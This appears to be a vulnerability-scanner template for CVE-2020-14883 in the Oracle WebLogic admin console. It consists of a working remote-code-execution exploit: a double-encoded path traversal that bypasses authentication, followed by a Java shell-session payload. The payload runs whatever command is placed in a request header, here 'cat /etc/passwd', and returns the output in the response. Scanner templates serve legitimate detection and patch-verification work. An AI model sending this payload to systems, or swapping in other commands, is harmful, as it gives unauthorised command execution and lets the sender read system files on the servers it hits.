id: CVE-2020-14883

info:
  name: Oracle WebLogic Server Administration Console Handle RCE
  author: pdteam
  severity: high
  tags: weblogic-console

requests:
  - method: POST
    path:
      - "{{BaseURL}}/console/images/%252e%252e%252fconsole.portal"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Test-Header: cat /etc/passwd

    body: |
      test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("Test-Header");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"
        condition: and

      - type: status
        status:
          - 200